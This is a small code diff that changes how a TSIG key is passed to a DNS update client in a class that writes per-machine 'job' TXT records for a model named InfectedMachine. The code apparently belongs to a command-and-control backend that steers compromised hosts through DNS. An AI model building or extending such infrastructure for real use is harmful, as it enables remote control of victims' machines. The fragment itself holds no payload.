@@ -13,7 +13,7 @@ from djangoproject.models import InfectedMachine
 class DnsService:
     def __init__(self):
         key_name = config('DNS_ZONE_KEY_NAME')
-        self.keyring = tsigkeyring.from_text({key_name: f"hmac-sha256:{config('DNS_ZONE_KEY')}"})
+        self.keyring = tsigkeyring.from_text({key_name: config('DNS_ZONE_KEY')})
         self.updater = Update("data.tm-it.fr", keyring=self.keyring, keyname=dns.name.from_text(key_name))
 
     def set_job_txt(self, machine: InfectedMachine, txt_value: str) -> Self:
